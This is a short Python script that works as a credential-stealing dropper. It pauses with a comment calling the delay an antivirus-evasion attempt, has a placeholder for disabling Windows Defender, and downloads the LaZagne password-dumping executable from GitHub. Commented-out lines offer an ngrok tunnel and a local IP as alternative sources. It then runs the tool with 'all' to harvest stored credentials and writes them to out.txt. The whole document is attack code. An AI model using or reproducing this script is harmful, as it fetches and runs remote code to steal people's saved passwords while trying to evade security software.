#!/usr/bin/python3

import wget
import subprocess
import shlex
import time

#url_ngrok = "http://5deabb212d7a.ngrok.io/lazagne.exe"
#url_local = "http://192.168.1.19/lazagne.exe"
url_git = "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe"

#waiting 10s before dowload AV evade try
wait = 10
print("Waiting : " + str(wait) + "seconds...")
for i in range(1, wait):
    time.sleep(1)
    print(str(wait-i) + "seconds remaining")
#disabling Windows defender


#downloading the program
print("[!] Dowloading program...")
filename = wget.download(url_git)
print("\n[!] Successfully downloaded of : " + filename)

#executing the program

cmd = "lazagne.exe all"
with open("out.txt", "w") as out:
	subprocess.run(shlex.split(cmd), stdout=out, shell=True)
	print("[+] SUCCESS !")

cmd = "type out.txt"
print("[+] Printing the results =>\n\n")
subprocess.run(shlex.split(cmd), shell=True)
print("====End program====")
